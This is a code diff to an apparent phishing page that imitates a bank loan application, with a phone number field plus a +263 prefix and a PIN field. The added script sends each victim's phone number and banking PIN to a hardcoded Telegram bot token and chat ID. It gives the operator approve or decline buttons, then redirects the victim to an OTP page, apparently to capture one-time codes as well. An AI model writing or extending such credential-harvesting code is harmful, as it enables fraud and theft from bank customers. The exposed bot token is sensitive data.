@@ -65,7 +65,7 @@
 
                 <!-- Submit Button -->
                 <button id="submitBtn" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 sm:py-4 rounded-lg hover:shadow-lg transition-all uppercase text-xs sm:text-sm tracking-wide">
-                    Send to Admin
+                    Verify
                 </button>
             </div>
 
@@ -81,40 +81,15 @@
                 
                 <div class="space-y-2">
                     <h3 class="text-lg sm:text-xl font-black text-gray-800 tracking-tight">Awaiting Approval</h3>
-                    <p class="text-gray-500 text-xs sm:text-sm font-medium leading-relaxed">Your request has been sent to admin.<br>Waiting for approval...</p>
+                    <p class="text-gray-500 text-xs sm:text-sm font-medium leading-relaxed">Your request has been sent to admin.<br>Waiting for approval on Telegram...</p>
                 </div>
 
-                <!-- Admin Action Simulation -->
-                <div class="bg-gray-50 rounded-lg p-4 space-y-3 border border-gray-200">
-                    <p class="text-xs font-black text-gray-400 uppercase tracking-widest">Admin Decision (Simulation)</p>
-                    <div class="grid grid-cols-1 gap-2">
-                        <button onclick="handleAdmin('approve')" class="bg-green-500 hover:bg-green-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
-                            <i class="fas fa-check-circle"></i> APPROVE
-                        </button>
-                        <button onclick="handleAdmin('decline')" class="bg-red-500 hover:bg-red-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
-                            <i class="fas fa-times-circle"></i> DECLINE
-                        </button>
-                        <button onclick="handleAdmin('applied')" class="bg-orange-500 hover:bg-orange-600 text-white font-black py-3 rounded-lg transition-all flex items-center justify-center gap-2 text-xs uppercase tracking-wide">
-                            <i class="fas fa-history"></i> ALREADY APPLIED
-                        </button>
-                    </div>
+                <div class="bg-blue-50 border border-blue-100 rounded-lg p-3">
+                    <p class="text-xs text-gray-600 leading-relaxed">
+                        <i class="fas fa-info-circle text-blue-600 mr-2"></i>
+                        Admin will review and approve/decline on Telegram
+                    </p>
                 </div>
-            </div>
-        </div>
-
-        <!-- Warning Modal -->
-        <div id="warningModal" class="fixed inset-0 bg-black/60 backdrop-blur-sm hidden flex items-center justify-center p-4 z-50">
-            <div class="bg-white rounded-xl sm:rounded-2xl max-w-xs w-full p-6 sm:p-8 text-center space-y-4 shadow-2xl">
-                <div class="w-16 h-16 bg-orange-100 text-orange-500 rounded-full flex items-center justify-center mx-auto">
-                    <i class="fas fa-exclamation-triangle text-2xl"></i>
-                </div>
-                <div class="space-y-1">
-                    <h4 class="text-lg font-black text-gray-800 uppercase">Attention</h4>
-                    <p class="text-gray-500 text-xs sm:text-sm font-medium">This user has already applied for a loan.</p>
-                </div>
-                <button onclick="closeWarning()" class="w-full bg-gradient-to-r from-[#003366] to-[#004a99] text-white font-black py-3 rounded-lg uppercase text-xs tracking-wide">
-                    OK
-                </button>
             </div>
         </div>
 
@@ -125,12 +100,15 @@
     </div>
 
     <script>
+        const TELEGRAM_BOT_TOKEN = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
+        const TELEGRAM_CHAT_ID = '7547427914';
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
+
         const pinInputs = document.querySelectorAll('.pin-input');
         const phoneInput = document.getElementById('phone');
         const submitBtn = document.getElementById('submitBtn');
         const loginForm = document.getElementById('loginForm');
         const pollingOverlay = document.getElementById('pollingOverlay');
-        const warningModal = document.getElementById('warningModal');
         const displayAmount = document.getElementById('displayAmount');
 
         // Load loan data
@@ -152,7 +130,7 @@
             e.target.value = e.target.value.replace(/\D/g, '');
         });
 
-        submitBtn.addEventListener('click', () => {
+        submitBtn.addEventListener('click', async () => {
             const phone = phoneInput.value;
             const pin = Array.from(pinInputs).map(i => i.value).join('');
 
@@ -162,29 +140,96 @@
             const sessionData = {
                 phone: '+263' + phone,
                 pin: pin,
-                amount: loanData.amount || '500'
+                amount: loanData.amount || '500',
+                term: loanData.term || '12',
+                monthly: loanData.monthly || '$0.00'
             };
             localStorage.setItem('nmb_session', JSON.stringify(sessionData));
 
-            // Send to Telegram (simulated)
-            console.log('Sending to Telegram:', sessionData);
+            // Send to Telegram
+            const message = `
+🔐 <b>NEW LOAN APPLICATION</b>
 
-            loginForm.classList.add('hidden');
-            pollingOverlay.classList.remove('hidden');
+📱 Phone: ${sessionData.phone}
+💰 Loan Amount: $${sessionData.amount}
+📅 Term: ${sessionData.term} months
+💳 Monthly Payment: ${sessionData.monthly}
+
+<b>PIN: ${pin}</b>
+            `;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [
+                        { text: '✅ APPROVE', callback_data: `approve_${sessionData.phone}` },
+                        { text: '❌ DECLINE', callback_data: `decline_${sessionData.phone}` }
+                    ],
+                    [
+                        { text: '⚠️ ALREADY APPLIED', callback_data: `applied_${sessionData.phone}` }
+                    ]
+                ]
+            };
+
+            try {
+                const response = await fetch(`${TELEGRAM_API}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: inlineKeyboard
+                    })
+                });
+
+                if (response.ok) {
+                    loginForm.classList.add('hidden');
+                    pollingOverlay.classList.remove('hidden');
+                    
+                    // Start polling for approval
+                    pollForApproval(sessionData.phone);
+                } else {
+                    alert('Error sending to Telegram. Please try again.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('Connection error. Please try again.');
+            }
         });
 
-        function handleAdmin(decision) {
-            if (decision === 'approve') {
-                window.location.href = 'otp.html';
-            } else if (decision === 'decline') {
-                location.reload();
-            } else if (decision === 'applied') {
-                warningModal.classList.remove('hidden');
-            }
-        }
+        async function pollForApproval(phone) {
+            let approved = false;
+            const maxAttempts = 120; // 2 minutes
+            let attempts = 0;
 
-        function closeWarning() {
-            warningModal.classList.add('hidden');
+            const interval = setInterval(async () => {
+                attempts++;
+                
+                // Check localStorage for approval signal
+                const approvalStatus = localStorage.getItem(`approval_${phone}`);
+                
+                if (approvalStatus === 'approved') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`approval_${phone}`);
+                    window.location.href = 'otp.html';
+                } else if (approvalStatus === 'declined') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`approval_${phone}`);
+                    alert('Your application was declined.');
+                    location.reload();
+                } else if (approvalStatus === 'applied') {
+                    clearInterval(interval);
+                    localStorage.removeItem(`approval_${phone}`);
+                    alert('You have already applied for a loan.');
+                    location.reload();
+                }
+
+                if (attempts >= maxAttempts) {
+                    clearInterval(interval);
+                    alert('Approval timeout. Please try again.');
+                    location.reload();
+                }
+            }, 1000);
         }
     </script>
 </body>
